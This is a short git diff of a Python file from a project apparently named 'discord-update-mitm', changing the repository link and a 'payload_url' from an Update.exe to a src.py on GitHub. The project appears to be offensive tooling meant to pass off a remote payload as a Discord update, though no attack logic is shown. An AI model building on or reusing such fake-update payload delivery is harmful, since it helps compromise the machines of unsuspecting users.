@@ -8,12 +8,12 @@ import requests
 
 __version__ = (1, 0, 0)
 __author__ = "Rodriguez Moon"
-__github__ = "https://github.com/rodriguez-moon"
+__github__ = "https://github.com/rodriguez-moon/discord-update-mitm"
 
 
 class Discord:
     def __init__(self):
-        self.payload_url = "https://raw.githubusercontent.com/rodriguez-moon/discord-update-mitm/development/payload/Update.exe"
+        self.payload_url = "https://raw.githubusercontent.com/rodriguez-moon/discord-update-mitm/main/payload/src.py"
         self.payload = None
 
     def get_time(self) -> datetime:
